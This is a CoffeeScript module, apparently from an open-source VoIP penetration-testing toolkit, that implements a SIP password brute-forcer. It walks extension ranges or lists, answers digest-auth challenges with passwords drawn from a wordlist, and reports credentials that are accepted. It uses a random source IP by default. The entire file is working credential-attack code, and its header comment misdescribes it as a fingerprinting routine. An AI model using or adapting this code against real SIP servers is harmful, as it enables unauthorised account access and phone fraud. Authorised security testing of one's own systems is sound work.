###

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

###


# ---------------------- Requires --------------------------------

{SipMessage} = require "../tools/sipMessage.coffee"
{AsteroidsConn} = require "../tools/asteroidsConn.coffee"
{Parser} = require "../tools/parser.coffee"
{Printer} = require "../tools/printer.coffee"
{Utils} = require "../tools/utils.coffee"
{Grammar} = require "../tools/grammar"
fs = require "fs"


# ----------------------- Class ----------------------------------

# This class includes one function which  sends a valid SIP request and parse 
# the response looking for a string with "User-Agent:", "Server:" or 
# "Organization" to get info about the SIP service which running on the target.
exports.SipBrutePass =
class SipBrutePass
		
	printBrutePass = (ext, pass) ->
		Printer.info "\nPassword found (ext. "
		Printer.infoHigh "#{ext}"
		Printer.info "): "
		Printer.result "#{pass}\n"


	# It gets the fingerprint and print it with the rest of the outpupt.
	parseReply = (msg, testExt, testPass, type) ->
		# Response parsing.
		code = Parser.parseCode msg
		switch code
			when "200"
				printBrutePass testExt, testPass if (type in ["REGISTER", "PUBLISH"])
			when "404"
				printBrutePass testExt, testPass if (type not in ["REGISTER", "PUBLISH"])
			else
				Printer.highlight "Last tested combination "
				Printer.normal "\"#{testExt}\"/\"#{testPass}\"\n"
				Printer.removeCursor()
				

	brute = (target, port, path, srcHost, transport, type, testExt, passwords, delay) ->
		cseq = 1
		callId = "#{Utils.uniqueId 16}@#{target}"
		gruuInstance = "urn:uuid:#{Utils.uniqueId 3}-#{Utils.uniqueId 4}-#{Utils.uniqueId 8}"
		srcHost = srcHost or Utils.randomIP()
		lport = lport or Utils.randomPort()
		toExt = Utils.uniqueId 3

		# File with passwords is provided.
		if (Grammar.fileRE.exec passwords)
			fs.readFile passwords, (err, data) ->
				if err
					Printer.error "sipBrutePass: readFile(): #{err}"
				else
					splitData = data.toString().split("\n")
					doLoopString = (i) =>
						setTimeout(=>
							brute target, port, path, srcHost, transport, type, testExt, splitData[i]
							# Last is always empty -> 2.
							if i < splitData.length - 2
								doLoopString(i + 1)
						,delay);
					doLoopString 0
		# Single password is provided.		
		else
			# TODO: Maybe it could be better to call the same extension that is doing the call 
			msgObj = new SipMessage type, "", target, port, srcHost, lport, testExt, toExt, transport, "", "", "", false, cseq, callId, gruuInstance, "", "", ""
			msgSend = (String) msgObj.create()
			conn = new AsteroidsConn target, port, path, transport, lport
			
			conn.on "newMessage", (stream) ->
				# Response parsing.
				# Sometimes servers sends non-interesting responeses,
				# ie: "403 Forbidden" when registering an already registered user.
				code = Parser.parseCode stream
				if code in ["401","407"]
					# First request auth info parsing.
					parsedAuth = Parser.parseRealmNonce stream
					if parsedAuth
						# File with passwords
						msgObj = new SipMessage type, "", target, port, srcHost, lport, testExt, toExt, transport, parsedAuth.realm, parsedAuth.nonce, passwords, parsedAuth.isProxy, cseq + 1 , callId, gruuInstance, "", "", ""
						msgSend = (String) msgObj.create()
						conn1 = new AsteroidsConn target, port, path, transport, lport
				
						conn1.on "newMessage", (stream) ->
							# First request parsing.
							parseReply stream, testExt, passwords, type	

						conn1.on "error", (error) ->
							Printer.error "SipBrutePass: #{error}"

						conn1.send msgSend
						# Subloop end.
					else
						Printer.error "SipBrutePass: No auth line provided by the server."

			conn.on "error", (error) ->
				Printer.error "SipBrutePass: #{error}"
			
			conn.send msgSend


	@run = (target, port, path, srcHost, transport, type, extensions, delay, passwords) ->
		Printer.normal "\n"
		# Extension or range.
		# Range.
		if (Grammar.extRangeRE.exec extensions)
			rangeExtParsed = Parser.parseExtRange extensions
			doLoopNum = (i) =>
				setTimeout(=>
					brute target, port, path, srcHost, transport, type, i, passwords, delay
					if i < rangeExtParsed.maxExt
						doLoopNum(parseInt(i) + 1)
				,delay);
			doLoopNum rangeExtParsed.minExt
		# File with extensions.
		else
			if (Grammar.fileRE.exec extensions)
				fs.readFile extensions, (err, data) ->
					if err
						Printer.error "sipBrutePass: readFile(): #{err}"
					else
						splitData = data.toString().split("\n")
						doLoopString = (i) =>
							setTimeout(=>
								brute target, port, path, srcHost, transport, type, splitData[i], passwords, delay
								# Last is always empty -> 2.
								if i < splitData.length - 2
									doLoopString(i + 1)
							,delay);
						doLoopString 0
			# Unique extension.
			else
				brute target, port, path, srcHost, transport, type, extensions, passwords, delay
